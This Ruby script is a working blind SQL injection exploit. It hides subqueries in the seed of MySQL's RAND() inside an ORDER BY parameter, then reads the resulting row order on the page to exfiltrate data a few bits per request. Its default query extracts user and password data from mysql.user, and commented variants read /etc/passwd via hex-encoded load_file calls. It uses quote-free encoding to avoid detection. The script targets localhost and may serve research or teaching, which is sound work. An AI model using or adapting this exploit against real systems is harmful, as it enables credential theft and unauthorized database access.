require 'pp'
require 'mysql'
require 'net/http'

$request_count = 0

def get(url)
  $request_count += 1
  print '.'
  Net::HTTP.get_response(URI.parse(url)).body
end

def order(rows, body)
  rows.to_a.sort! do |x,y|
    body.index(x[1]) <=> body.index(y[1])
  end.map { |r| r[0]}
end

def generate_random_results_until_collision(row_count)
  return {} if row_count < 1
  # hostname, user, password
  $mysql ||= Mysql.new('localhost', 'root', '')

  sql = 'SELECT 0'
  (row_count-1).times{ |i| sql += " UNION SELECT #{i+1}" }
  sql += ' ORDER BY RAND(%s)'

  lookup = {}
  0.upto(Float::INFINITY) do |i|
    result = $mysql.query(sql%i)
    result_rows = []
    result.each{ |r| result_rows << r[0].to_i }
    break unless lookup[result_rows].nil?
    lookup[result_rows] = i
  end
  return lookup
end

def hex_char_to_no_quote_string(hex_char)
  base_10 = hex_char.to_i(16)
  if base_10 >= 0xA
    no_quotes = "0x#{hex_char.ord.to_s(16)}"
  else
    # base 10 and base 16 are the same from 0 to 9
    no_quotes = base_10
  end
  return no_quotes
end

def binary_char_to_no_quote_string(binary_char)
  base_10 = binary_char.to_i(2)
  # we already have 4 chars and first char is 1, can just drop straight in
  if base_10 >= 0b1000
    no_quotes = binary_char
  else
    no_quotes = '0x'
    binary_char.each_char do |c|
      no_quotes += c.ord.to_s(16)
    end
  end
  return no_quotes
end

def extract_binary_string(params)
  injection_url = params[:url] or raise 'url is required'
  rows = params[:rows] or raise 'rows is required'
  sql = params[:sql] or raise 'sql is required'
  quotes_allowed = params[:quotes_allowed] || false

  rand_results = generate_random_results_until_collision(rows.size)
  bits = Math.log(rand_results.size, 2).floor
  # we will lose a bit if we didn't have a spare state for end of string canary
  bits -= 1 unless rand_results.size >= ((2**bits)+1)
  puts "We can steal #{bits} bits per request"
  lookup = Hash[rand_results.take(2**bits+1)]

  # need canary to know when to stop
  canary = lookup.drop(lookup.size-1)[0]
  canary_order = canary[0]
  canary_value = canary[1]

  binary_string = ''
  request_count = 0

  1.step(Float::INFINITY, bits) do |i|
    # probably going to be a query, so wrap to make it a subquery
    injection = '(%s)' % sql
    # can't go straight to binary, HEX is less chars than ASCII & less detected
    injection = 'HEX(%s)' % injection
    # now we can convert to binary - done this way to prevent int max with conv()
    0.upto(0xF) do |j|
      hex_char = j.to_s(16).upcase
      binary_char = j.to_s(2).rjust(4,'0')

      if quotes_allowed
        find = "'#{hex_char}'"
        replace = "'#{binary_char}'"
      else
        find = hex_char_to_no_quote_string(hex_char)
        replace = binary_char_to_no_quote_string(binary_char)
      end

      injection = "REPLACE(%s,#{find},#{replace})" % injection
    end
    # substr to how many bits we can get per request, MySQL starts at 1, not 0
    binary_substring = "SUBSTR(%s,#{i},#{bits})" % injection
    # get the length for later use
    injection_length = 'LENGTH(%s)' % binary_substring
    # convert binary to base 10 for RAND(), new variable so we can re-use
    injection = 'CONV(%s,2,10)' % binary_substring
    # if substr didn't get 100%, we've hit the end, kill canary to alert us
    injection = "IF(%s=%s,%s,%s)" % [injection_length,bits,injection,canary_value]
    # drop injection into rand as the seed
    injection = 'RAND(%s)' % injection
    # drop injection into order param
    url = injection_url % injection

    html = get(url)
    request_count += 1

    o = order(rows, html)

    if o == canary_order
      # prepend a one for uniqueness
      injection = 'CONCAT(1,%s)' % binary_substring
      # convert binary to base 10 for RAND(), new variable so we can re-use
      injection = 'CONV(%s,2,10)' % injection
      # drop injection into rand as the seed
      injection = 'RAND(%s)' % injection
      # drop injection into order param
      url = injection_url % injection
      html = get(url)
      request_count += 1
      o = order(rows, html)
      binary_string += lookup[o].to_s(2).slice(1..-1)
      break
    else
      binary_string += lookup[o].to_s(2).rjust(bits,'0')
    end
  end
  return binary_string
end

rows = {
  0 => 'admin',
  1 => 'ahfy',
  2 => 'guest',
  3 => 'eMole',
  4 => 'html',
  5 => 'moderator',
  6 => 'test',
}

sql = 'SELECT+GROUP_CONCAT(user,password)+FROM+mysql.user'
#sql = 'SELECT+CONCAT_WS(0x3a,user,password)+FROM+mysql.user+WHERE+USER=0x726f6f74+LIMIT+1'
#sql = 'SELECT+load_file(0x2F6574632F706173737764)'
#sql = 'SELECT+compress(load_file(0x2F6574632F706173737764))'
injection_url = 'http://localhost/example_site/?order=%s'

binary_string = extract_binary_string({
  :url => injection_url,
  :rows => rows,
  :sql => sql,
})



print "\n"
puts 'Stolen Binary String'
puts binary_string

puts 'Bits'
puts binary_string.size

puts 'Chars'
puts [binary_string].pack('B*').size

puts 'ASCII String'
puts [binary_string].pack('B*')

puts 'Request Count'
puts $request_count
